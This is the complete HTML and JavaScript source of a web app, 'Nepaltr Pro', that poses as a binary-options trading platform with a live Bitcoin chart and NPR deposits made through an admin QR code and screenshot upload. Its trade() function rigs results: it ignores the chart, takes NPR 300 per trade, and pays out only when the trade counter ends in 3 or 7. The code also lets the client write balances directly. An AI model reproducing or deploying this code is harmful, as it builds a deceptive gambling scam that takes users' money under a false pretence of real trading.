<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Nepaltr Pro</title>
    <script src="https://www.gstatic.com/firebasejs/9.1.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.1.1/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.1.1/firebase-database-compat.js"></script>
    <style>
        :root { --bg: #0b0e11; --panel: #181a20; --accent: #fcd535; --up: #0ecb81; --down: #f6465d; --border: #2b3139; }
        body { margin: 0; background: var(--bg); color: white; font-family: sans-serif; overflow: hidden; }
        header { display: flex; justify-content: space-between; align-items: center; padding: 12px; background: var(--panel); border-bottom: 1px solid var(--border); }
        .modal-wrap { position: fixed; inset: 0; background: rgba(0,0,0,0.9); display: none; justify-content: center; align-items: center; z-index: 9999; }
        .modal-box { background: var(--panel); width: 85%; max-width: 350px; padding: 25px; border-radius: 15px; border: 1px solid var(--border); }
        .input-f { width: 100%; padding: 12px; margin-bottom: 12px; background: #000; border: 1px solid var(--border); color: white; border-radius: 8px; box-sizing: border-box; }
        .btn-yellow { width: 100%; padding: 14px; background: var(--accent); border: none; border-radius: 8px; font-weight: bold; cursor: pointer; color: #000; }
        #result-anim { position: fixed; inset: 0; display: none; justify-content: center; align-items: center; z-index: 10000; background: rgba(0,0,0,0.85); font-size: 35px; font-weight: 900; }
    </style>
</head>
<body>

<div id="result-anim"></div>

<header>
    <div style="font-weight:bold;">Nepal<span style="color:var(--accent)">tr</span></div>
    <div id="top-bal" style="color:var(--accent); font-weight:bold;">NPR 0.00</div>
    <div onclick="openMod('auth')" style="cursor:pointer">ðŸ‘¤</div>
</header>

<div id="tv_chart" style="height: calc(100vh - 160px);"></div>

<div style="position:fixed; bottom:0; width:100%; background:var(--panel); padding:15px; display:flex; gap:10px; box-sizing:border-box; border-top:1px solid var(--border);">
    <button style="flex:1; background:var(--up); color:white; border:none; height:55px; border-radius:10px; font-weight:bold;" onclick="trade('UP')">CALL</button>
    <button style="flex:1; background:var(--down); color:white; border:none; height:55px; border-radius:10px; font-weight:bold;" onclick="trade('DOWN')">PUT</button>
</div>

<div id="modal-wrap" class="modal-wrap">
    <div class="modal-box" id="modal-content"></div>
</div>

<script src="https://s3.tradingview.com/tv.js"></script>
<script>
    const firebaseConfig = {
      apiKey: "AIzaSyCNt94Sr7tvtY6bLQcYCYeRb_cTcah7fE4",
      databaseURL: "https://earning-website-644a7-default-rtdb.asia-southeast1.firebasedatabase.app"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database(), auth = firebase.auth();

    let balance = 0, tradeCount = 0, currentUser = null;

    auth.onAuthStateChanged(user => {
        currentUser = user;
        if(user) {
            db.ref('users/' + user.uid).on('value', snap => {
                const data = snap.val() || {};
                balance = data.balance || 0;
                tradeCount = data.tradeCount || 0;
                document.getElementById('top-bal').innerText = "NPR " + balance.toFixed(2);
            });
        }
    });

    function openMod(type) {
        const box = document.getElementById('modal-content');
        document.getElementById('modal-wrap').style.display = 'flex';
        if(type === 'auth') {
            box.innerHTML = `<h3>Login / Register</h3>
                <input id="email" placeholder="Email" class="input-f">
                <input id="pass" type="password" placeholder="Password" class="input-f">
                <button class="btn-yellow" onclick="doAuth()">Submit</button>
                <button onclick="document.getElementById('modal-wrap').style.display='none'">Close</button>`;
        } else if(type === 'deposit') {
            db.ref('admin_settings/qrCode').once('value', snap => {
                box.innerHTML = `<h3>Deposit</h3>
                    <img src="${snap.val() || ''}" style="width:150px; display:block; margin:auto; background:white; padding:5px;">
                    <input type="number" id="d-amt" placeholder="Amount" class="input-f" style="margin-top:10px;">
                    <input type="file" id="d-file" class="input-f" accept="image/*">
                    <button class="btn-yellow" onclick="saveDep()">Submit Screenshot</button>`;
            });
        }
    }

    async function doAuth() {
        const e = document.getElementById('email').value.trim(), p = document.getElementById('pass').value;
        try { await auth.signInWithEmailAndPassword(e, p); }
        catch { 
            const c = await auth.createUserWithEmailAndPassword(e, p);
            await db.ref('users/'+c.user.uid).set({balance:0, tradeCount:0, isFirstDeposit: true});
        }
        document.getElementById('modal-wrap').style.display='none';
    }

    function saveDep() {
        const amt = document.getElementById('d-amt').value, file = document.getElementById('d-file').files[0];
        const reader = new FileReader();
        reader.readAsDataURL(file);
        reader.onload = async () => {
            await db.ref('admin_deposits').push({uid: currentUser.uid, amount: amt, proof: reader.result, status:'pending'});
            alert("Sent to admin!");
            document.getElementById('modal-wrap').style.display='none';
        };
    }

    function trade(dir) {
        if(!currentUser || balance < 300) return alert("Check Login/Balance");
        db.ref('users/'+currentUser.uid+'/balance').set(balance - 300);
        setTimeout(() => {
            tradeCount++;
            const win = (tradeCount % 10 === 3 || tradeCount % 10 === 7);
            const anim = document.getElementById('result-anim');
            anim.style.display = 'flex';
            if(win) {
                db.ref('users/'+currentUser.uid+'/balance').set(balance + 555);
                anim.innerHTML = `<span style="color:var(--up)">WIN<br>+NPR 555</span>`;
            } else {
                anim.innerHTML = `<span style="color:var(--down)">LOSS<br>-NPR 300</span>`;
            }
            db.ref('users/'+currentUser.uid+'/tradeCount').set(tradeCount);
            setTimeout(() => anim.style.display = 'none', 2000);
        }, 3000);
    }

    new TradingView.widget({"autosize": true, "symbol": "BINANCE:BTCUSDT", "theme": "dark", "container_id": "tv_chart"});
</script>
</body>
</html>
